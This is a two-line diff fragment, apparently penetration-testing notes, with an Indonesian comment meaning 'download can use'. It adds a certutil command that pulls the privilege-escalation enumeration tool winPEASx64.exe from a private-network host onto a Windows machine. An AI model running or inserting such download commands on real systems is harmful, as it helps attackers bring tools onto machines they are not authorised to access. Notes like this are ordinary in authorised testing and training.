@@ -1,0 +1,2 @@
+download bisa pakai
+- certutil.exe -urlcache -split -f "http://10.1.1.1/winPEASx64.exe" winPEASx64.exe
